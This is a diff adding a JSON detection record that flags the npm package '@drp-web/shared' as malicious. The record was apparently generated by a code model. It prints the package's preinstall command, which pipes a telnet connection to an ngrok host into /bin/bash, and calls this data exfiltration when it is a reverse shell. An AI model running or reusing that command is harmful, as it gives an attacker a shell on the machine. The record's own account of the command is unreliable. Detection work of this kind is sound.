@@ -1,0 +1,35 @@
+{
+  "package_name": "@drp-web/shared",
+  "version": "1.2.7",
+  "label": "malicious",
+  "behaviors": [
+    {
+      "category": "data_exfiltration",
+      "summary": "The package.json scripts.preinstall command appears to be executing a command to update and install netcat, cat, and telnet. This could potentially be a data exfiltration behavior.",
+      "details": "The command executed is 'apk add --update netcat; cat-openbsd; telnet2.tcp.ngrok.io18363|/bin/bash'. This command appears to be updating and installing netcat, cat, and telnet, which could be used for data exfiltration.",
+      "confidence": 0.95,
+      "evidence_commands": [
+        "apk add --update netcat",
+        "cat-openbsd",
+        "telnet2.tcp.ngrok.io18363|/bin/bash"
+      ],
+      "evidence_files": [],
+      "evidence_apis": [],
+      "evidence_domains": [],
+      "evidence_env_vars": []
+    }
+  ],
+  "risk_vector": [
+    "data_exfiltration"
+  ],
+  "analyst_note": "This JSON object indicates that the package.json scripts.preinstall command is executing a command to update and install netcat, cat, and telnet. This could potentially be a data exfiltration behavior. The confidence score is 0.95, indicating high confidence that this is a malicious intent.",
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "semantic_v2.0",
+    "routing": "flag",
+    "structural_risk_score": 0.6333,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-26T21:53:25.158876"
+}
